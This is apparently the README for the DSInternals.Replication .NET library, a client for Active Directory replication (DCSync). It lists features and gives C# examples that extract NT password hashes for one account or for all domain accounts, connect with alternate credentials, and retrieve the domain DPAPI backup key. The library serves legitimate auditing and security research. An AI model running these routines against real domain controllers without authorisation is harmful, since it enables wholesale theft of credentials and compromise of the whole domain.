# DSInternals Replication Library

## Introduction

The **DSInternals.Replication** package implements a client for the **Active Directory Replication Service Remote Protocol (MS-DRSR)**. This is commonly known as **DCSync** and allows you to remotely extract password hashes and other sensitive data from domain controllers.

### Key Features

- **DCSync Attack**: Replicate password hashes from domain controllers remotely
- **Full Account Replication**: Retrieve complete account objects including all attributes
- **Incremental Replication**: Sync only changed objects since last replication
- **DPAPI Backup Key Retrieval**: Extract domain DPAPI backup keys for credential decryption
- **KDS Root Key Access**: Retrieve Key Distribution Service root keys for gMSA password computation
- **Schema Replication**: Replicate the Active Directory schema

## Platform Compatibility

Applications using this library may encounter the `BadImageFormatException` or `FileNotFoundException` exceptions
when trying to load the `DSInternals.Replication.Interop.dll` assembly.
This is because the assembly contains platform-specific code.
To resolve this issue, ensure that your project is configured to target the appropriate platform (x64, x86, or arm64).

Modern SDK-style projects should contain these settings:

```xml
<PropertyGroup>
  <TargetFrameworks>net10.0-windows;net48</TargetFrameworks>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
<ItemGroup>
  <PackageReference Include="DSInternals.Replication" Version="6.3.0" />
</ItemGroup>
```

Legacy .NET Framework projects using `packages.config` should contain the following settings:

```xml
<Import Project="packages\DSInternals.Replication.6.3.0\build\net48\DSInternals.Replication.props" Condition="Exists('packages\DSInternals.Replication.6.3.0\build\net48\DSInternals.Replication.props')" />
<PropertyGroup>
  <Prefer32Bit>false</Prefer32Bit>
  <PreferNativeArm64>true</PreferNativeArm64>
</PropertyGroup>
```

## Usage Examples

### Connecting to a Domain Controller

```csharp
using DSInternals.Replication;
using System.Net;

string domainController = "dc01.contoso.com";

// Connect using current credentials
using var client = new DirectoryReplicationClient(domainController);

Console.WriteLine($"Connected to: {client.DomainNamingContext}");
Console.WriteLine($"NetBIOS Domain: {client.NetBIOSDomainName}");
```

### Replicating a Single Account (DCSync)

```csharp
using DSInternals.Replication;
using DSInternals.Common.Data;

string domainController = "dc01.contoso.com";

using var client = new DirectoryReplicationClient(domainController);

// Replicate a specific account by distinguished name
string userDn = "CN=Administrator,CN=Users,DC=contoso,DC=com";
DSAccount account = client.GetAccount(userDn);

Console.WriteLine($"Account: {account.SamAccountName}");
Console.WriteLine($"SID: {account.Sid}");

if (account.NTHash != null)
{
    string ntHash = BitConverter.ToString(account.NTHash).Replace("-", "");
    Console.WriteLine($"NT Hash: {ntHash}");
}
```

### Replicating All Domain Accounts

```csharp
using DSInternals.Replication;
using DSInternals.Common.Data;

string domainController = "dc01.contoso.com";

using var client = new DirectoryReplicationClient(domainController);

// Enumerate all accounts in the domain
foreach (DSAccount account in client.GetAccounts())
{
    Console.WriteLine($"Account: {account.SamAccountName}");

    if (account.NTHash != null)
    {
        string ntHash = BitConverter.ToString(account.NTHash).Replace("-", "");
        Console.WriteLine($"  NT Hash: {ntHash}");
    }
}
```

### Connecting with Alternate Credentials

```csharp
using DSInternals.Replication;
using System.Net;

string domainController = "dc01.contoso.com";

// Create credentials
var credential = new NetworkCredential(
    userName: "admin",
    password: "P@ssw0rd",
    domain: "CONTOSO"
);

using var client = new DirectoryReplicationClient(domainController, credential);

// Now perform replication operations...
```

### Extracting DPAPI Backup Keys

```csharp
using DSInternals.Replication;

string domainController = "dc01.contoso.com";

using var client = new DirectoryReplicationClient(domainController);

// Get the domain DPAPI backup key
var backupKey = client.GetDPAPIBackupKey();

Console.WriteLine($"Key ID: {backupKey.KeyId}");
// Use the key to decrypt DPAPI-protected data
```

## Security Considerations

This library performs operations that require elevated privileges:

- **Replicating Directory Changes** permission (for basic replication)
- **Replicating Directory Changes All** permission (for password hash replication)
- These permissions are typically held by Domain Admins and Domain Controllers
